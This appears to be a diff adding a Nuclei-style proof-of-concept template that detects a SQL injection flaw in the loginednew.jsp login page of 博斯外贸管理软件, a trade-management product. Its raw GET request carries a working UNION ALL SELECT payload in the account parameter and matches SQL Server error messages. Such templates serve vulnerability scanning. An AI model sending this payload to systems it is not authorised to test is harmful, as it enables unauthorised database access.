@@ -1,0 +1,37 @@
+id: poc-yaml-51boss-loginednew-jsp-sqli
+info:
+  name: 博斯外贸管理软件 loginednew.jsp SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+http:
+  - raw:
+      - |
+        GET /loginednew.jsp?welcome=%BB%B6%D3%AD%CA%B9%D3%C3%20%B2%A9%CB%B9%C8%ED%BC%FEV6.0(20110701)&systemname=BS&account=1%27+UNION+ALL+SELECT+NULL,NULL,@@VERSION,NULL--&password=1&val=0000&availHeight=834&Safari=Y&loginurl= HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "java.sql.SQLException"
+        part: body
+      - type: word
+        words:
+          - "转换为数据类型为"
+        part: body
+      - type: word
+        words:
+          - "Microsoft SQL Server"
+        part: body
+      - type: word
+        words:
+          - "将 nvarchar 值"
+        part: body
+        condition: and
+    extractors:
+      - type: regex
+        regex:
+          - "@@VERSION"
